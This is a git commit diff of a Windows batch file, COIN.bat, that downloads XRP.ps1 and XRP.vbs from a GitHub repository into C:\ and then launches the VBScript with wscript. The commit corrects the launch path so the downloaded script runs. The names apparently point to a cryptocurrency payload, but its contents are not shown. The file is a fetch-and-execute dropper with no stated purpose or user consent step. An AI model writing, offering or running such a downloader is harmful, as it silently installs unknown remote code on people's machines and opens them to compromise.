3220d5f03bfc54b7a81c9c36a5947ca3a96f2a92
GALVINVN <112307302+GALVINVN@users.noreply.github.com>
2025-01-10 12:05:34 +0700

    COIN.bat

--- COIN.bat
+++ COIN.bat
@@ -1,5 +1,5 @@
 @echo off
 powershell -NoProfile -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/GALVINVN/coin/refs/heads/main/XRP.ps1' -OutFile 'C:\XRP.ps1'"
 powershell -NoProfile -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/GALVINVN/coin/refs/heads/main/XRP.vbs' -OutFile 'C:\XRP.vbs'"
-powershell -NoProfile -Command "Start-Process -FilePath 'wscript.exe' -ArgumentList 'C:\RUNSYS_XRP.vbs"
+powershell -NoProfile -Command "Start-Process -FilePath 'wscript.exe' -ArgumentList 'C:\XRP.vbs"
 exit
